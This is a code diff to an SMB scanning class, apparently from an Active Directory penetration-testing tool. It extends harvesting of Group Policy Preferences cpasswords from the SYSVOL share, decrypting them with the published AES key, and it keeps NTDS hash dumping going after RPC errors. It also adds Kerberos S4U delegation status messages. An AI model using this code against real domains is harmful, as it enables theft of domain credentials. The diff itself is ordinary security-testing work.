@@ -8,7 +8,8 @@ import traceback
 import struct
 import ntpath
 import datetime
-import xml.etree.ElementTree as ET
+#import xml.etree.ElementTree as ET
+from xml.dom import minidom
 from io import BytesIO
 from Cryptodome.Cipher import AES
 from base64 import b64decode
@@ -83,7 +84,7 @@ class SMBScan:
 
     def auth(self, domain='WORKGROUP', username=None, password=None, hash=None):
         if not self.conn:
-            Output.write({'target': self.url(), 'message': 'enum_host_info(): please connect first'})
+            Output.write({'target': self.url(), 'message': 'auth(): please connect first'})
 
         self.local_ip = self.conn.getSMBServer().get_socket().getsockname()[0]
 
@@ -120,7 +121,7 @@ class SMBScan:
                 self.is_admin = self.check_if_admin(domain, username, password, hash)
 
         except impacket.smbconnection.SessionError as e:
-            error, desc = e.getErrorString()
+            error = e.getErrorString()
             if 'STATUS_ACCESS_DENIED' in str(error):
                 # Can happen on both login() and check_if_admin() 
                 pass
@@ -321,6 +322,7 @@ class SMBScan:
                 username_principal = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
 
 
+                Output.highlight({'target': self.url(), 'message': "Requesting TGT"})
                 tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(username_principal, password, domain,
                                                                     unhexlify(lmhash), unhexlify(nthash), '',
                                                                     self.hostname)
@@ -407,6 +409,8 @@ class SMBScan:
                 print("%s: %s\n%s" % (type(e), str(e), traceback.format_exc()))
                 if 'KRB_AP_ERR_SKEW' in str(e):
                     Output.error("KRB_AP_ERR_SKEW received, please synchronize your time with the DC using : sudo ntpdate %s" % self.hostname)
+                elif 'KDC_ERR_BADOPTION' in str(e):
+                    Output.error("KDC_ERR_BADOPTION received, probably SPN is not allowed to delegate by user %s or initial TGT not forwardable" % userName)
                 else:
                     print("%s: %s\n%s" % (type(e), str(e), traceback.format_exc()))
             except Exception as e:
@@ -516,6 +520,7 @@ class SMBScan:
                       (int(cipher.enctype),int(constants.EncryptionTypes.rc4_hmac.value)))
 
         logging.info('\tRequesting S4U2self')
+        Output.highlight({'target': self.url(), 'message': "Requesting S4U2self"})
         message = encoder.encode(tgsReq)
 
         r = sendReceive(message, domain, kdcHost)
@@ -616,6 +621,7 @@ class SMBScan:
         message = encoder.encode(tgsReq)
 
         logging.info('\tRequesting S4U2Proxy')
+        Output.highlight({'target': self.url(), 'message': "Requesting S4U2Proxy"})
         r = sendReceive(message, domain, kdcHost)
 
         tgs = decoder.decode(r, asn1Spec=TGS_REP())[0]
@@ -1088,37 +1094,145 @@ class SMBScan:
         for entry in enum.RIDBruteforce(start, end):
             yield entry
 
+    def get_file_data(self, share, path):
+        buf = BytesIO()
+        self.conn.getFile(share, path, buf.write)
+        data = buf.getvalue()
+
+        return data
+
 
     def list_gpps(self):
+        gpp_share = 'SYSVOL'
         sysvol_found = False
         for share in self.list_shares():
-            if share['name'] == 'SYSVOL' and 'READ' in share['access']:
+            if share['name'] == gpp_share and 'READ' in share['access']:
                 sysvol_found = True
                 break
 
         if not sysvol_found:
-            print('No access to SYSVOL share')
+            Output.error({'target': self.url(), 'message': 'No access to %s share' % gpp_share})
             return
 
         gpp_files = []
-        for path in self.list_content('\\', 'SYSVOL', recurse=10):
+        for path in self.list_content('\\', gpp_share, recurse=10):
             filename = path['name'].split('\\')[-1]
-            if filename in ['Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml']:
+            if filename.endswith(".xml"):
                 gpp_files.append(path['name'])
 
         for path in gpp_files:
             buf = BytesIO()
-            self.conn.getFile('SYSVOL', path, buf.write)
+            self.conn.getFile(gpp_share, path, buf.write)
+
+            root = minidom.parseString(buf.getvalue())
+            xmltype = root.childNodes[0].tagName
+            # function to get attribute if it exists, returns "" if empty
+            read_or_empty = lambda element, attribute: (element.getAttribute(attribute) if element.getAttribute(attribute) is not None else "")
+
+            # ScheduledTasks
+            if xmltype == "ScheduledTasks":
+                for topnode in root.childNodes:
+                    task_nodes = [c for c in topnode.childNodes if isinstance(c, minidom.Element)]
+                    for task in task_nodes:
+                        for property in task.getElementsByTagName("Properties"):
+                            """
+                            print({
+                                "tagName": xmltype,
+                                "attributes": [
+                                    ("name", read_or_empty(task, "name")),
+                                    ("runAs", read_or_empty(property, "runAs")),
+                                    ("cpassword", read_or_empty(property, "cpassword")),
+                                    ("password", self.__decrypt_cpassword(read_or_empty(property, "cpassword"))),
+                                    ("changed", read_or_empty(property.parentNode, "changed")),
+                                ],
+                                "file": path
+                            })
+                            """
+                            newname = read_or_empty(property, "newName")
+                            username = read_or_empty(property, "userName")
+                            password = self.__decrypt_cpassword(read_or_empty(property, "cpassword"))
+
+                            if password != "":
+                                yield {
+                                    'newname': newname,
+                                    'username': username,
+                                    'password': password,
+                                    'path': path,
+                                }
+            elif xmltype == "Groups":
+                for topnode in root.childNodes:
+                    task_nodes = [c for c in topnode.childNodes if isinstance(c, minidom.Element)]
+                    for task in task_nodes:
+                        for property in task.getElementsByTagName("Properties"):
+                            """
+                            print({
+                                "tagName": xmltype,
+                                "attributes": [
+                                    ("newName", read_or_empty(property, "newName")),
+                                    ("userName", read_or_empty(property, "userName")),
+                                    ("cpassword", read_or_empty(property, "cpassword")),
+                                    ("password", self.__decrypt_cpassword(read_or_empty(property, "cpassword"))),
+                                    ("changed", read_or_empty(property.parentNode, "changed")),
+                                ],
+                                "file": path
+                            })
+                            """
+                            newname = read_or_empty(property, "newName")
+                            username = read_or_empty(property, "userName")
+                            password = self.__decrypt_cpassword(read_or_empty(property, "cpassword"))
+
+                            if password != "":
+                                yield {
+                                    'newname': newname,
+                                    'username': username,
+                                    'password': password,
+                                    'path': path,
+                                }
+            else:
+                for topnode in root.childNodes:
+                    task_nodes = [c for c in topnode.childNodes if isinstance(c, minidom.Element)]
+                    for task in task_nodes:
+                        for property in task.getElementsByTagName("Properties"):
+                            """
+                            print({
+                                "tagName": xmltype,
+                                "attributes": [
+                                    ("newName", read_or_empty(property, "newName")),
+                                    ("userName", read_or_empty(property, "userName")),
+                                    ("cpassword", read_or_empty(property, "cpassword")),
+                                    ("password", self.__decrypt_cpassword(read_or_empty(property, "cpassword"))),
+                                    ("changed", read_or_empty(property.parentNode, "changed")),
+                                ],
+                                "file": path
+                            })
+                            """
+
+                            newname = read_or_empty(property, "newName")
+                            username = read_or_empty(property, "userName")
+                            password = self.__decrypt_cpassword(read_or_empty(property, "cpassword"))
+
+                            if password != "":
+                                yield {
+                                    'newname': newname,
+                                    'username': username,
+                                    'password': password,
+                                    'path': path,
+                                }
+
+
+            """
             xml = ET.fromstring(buf.getvalue())
 
-            if 'Groups.xml' in path:
+            tag = xml.tag
+
+            if tag == 'Groups':
                 xml_section = xml.findall("./User/Properties")
+
+            elif tag == 'ScheduledTasks':
+                xml_section = xml.findall('./Task/Properties')
 
             elif 'Services.xml' in path:
                 xml_section = xml.findall('./NTService/Properties')
-
-            elif 'ScheduledTasks.xml' in path:
-                xml_section = xml.findall('./Task/Properties')
 
             elif 'DataSources.xml' in path:
                 xml_section = xml.findall('./DataSource/Properties')
@@ -1131,6 +1245,7 @@ class SMBScan:
 
             for attr in xml_section:
                 props = attr.attrib
+                print(str(props))
 
                 if 'cpassword' in props:
 
@@ -1145,23 +1260,31 @@ class SMBScan:
                         'password': password,
                         'path': path,
                     }
+            """
 
     def __decrypt_cpassword(self, cpassword):
+        if len(cpassword) != 0:
 
-        #Stolen from hhttps://gist.github.com/andreafortuna/4d32100ae03abead52e8f3f61ab70385
+            #Stolen from hhttps://gist.github.com/andreafortuna/4d32100ae03abead52e8f3f61ab70385
 
-        # From MSDN: http://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be%28v=PROT.13%29#endNote2
-        key = unhexlify('4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b')
-        cpassword += "=" * ((4 - len(cpassword) % 4) % 4)
-        password = b64decode(cpassword)
-        IV = "\x00" * 16
-        decrypted = AES.new(key, AES.MODE_CBC, IV.encode("utf8")).decrypt(password)
-        padding_bytes = decrypted[-1]
-        decrypted = decrypted[:-padding_bytes]
-        return decrypted.decode('utf16')
+            # From MSDN: http://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be%28v=PROT.13%29#endNote2
+            key = unhexlify('4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b')
+            cpassword += "=" * ((4 - len(cpassword) % 4) % 4)
+            password = b64decode(cpassword)
+            IV = "\x00" * 16
+            decrypted = AES.new(key, AES.MODE_CBC, IV.encode("utf8")).decrypt(password)
+            padding_bytes = decrypted[-1]
+            decrypted = decrypted[:-padding_bytes]
+            return decrypted.decode('utf16')
+        else:
+            return ""
 
     def dump_ntds(self, method, callback_func=None):
-        self.enable_remoteops()
+        try:
+            self.enable_remoteops()
+        except impacket.dcerpc.v5.rpcrt.DCERPCException as e:
+            Output.error("DCERPCException caught: %s. Still trying to dump" % str(e))
+            pass
         use_vss_method = False
         NTDSFileName   = None
 
@@ -1194,7 +1317,7 @@ class SMBScan:
                 print('%s: %s' % (type(e), e))
         add_ntds_hash.ntds_hashes = 0
 
-        if self.remote_ops and self.bootkey:
+        if self.remote_ops:
             try:
                 if method == 'vss':
                     NTDSFileName = self.remote_ops.saveNTDS()
@@ -1347,7 +1470,7 @@ class SMBScan:
         if password is None:
             password = ''
         
-        endpoint = '\winreg'
+        endpoint = '\\winreg'
         rpctransport = transport.SMBTransport(self.hostname, self.port, endpoint, username, password, domain, lmhash, nthash, None, doKerberos = do_kerberos)
    
         dce = rpctransport.get_dce_rpc()
